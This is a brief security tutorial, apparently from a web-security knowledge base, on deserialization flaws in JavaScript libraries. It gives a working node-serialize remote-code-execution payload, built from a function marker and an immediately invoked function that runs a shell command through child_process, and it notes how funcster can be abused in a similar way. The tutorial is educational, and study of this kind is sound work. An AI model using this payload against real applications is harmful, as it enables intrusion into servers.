Deserialization
========================================

Introduction
----------------------------------------
JavaScript itself does not have a deserialization implementation, but some libraries such as node-serialize, serialize-to-js, etc. support the deserialization function. These libraries usually use JSON to store data, but unlike native functions JSON.parse and JSON.stringify, these libraries support deserialization of any object, especially functions. If used improperly, deserialization problems may occur.

Payload construct
----------------------------------------
Here is the simplest example, first obtain the serialized output

.. code-block:: javascript

var y = {
rce : function(){
require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
},
}
var serialize = require('node-serialize');
console.log("Serialized: 
" + serialize.serialize(y));

After execution above, it will return

.. code-block:: javascript

{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });}"}

However, this payload will not be executed after deserialization, but it supports Immediately Invoked Function Expression in JS, such as ``(function () { /* code */ } ());` ` This will execute the code in the function. Then you can use this method to modify the serialized string to complete a deserialization. The final payload test is as follows:


.. code-block:: javascript

var serialize = require('node-serialize');
var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
serialize.unserialize(payload);


Payload Construct II
----------------------------------------
The above mentioned is the construction method of deserialization libraries such as node-serialize. There is also a type of library such as funcster, which is executed using the method of directly splicing string constructors.

.. code-block:: javascript

return "module.exports=(function(module,exports){return{" + entries + "};})();";

This way, the payload can be constructed using the corresponding closure.
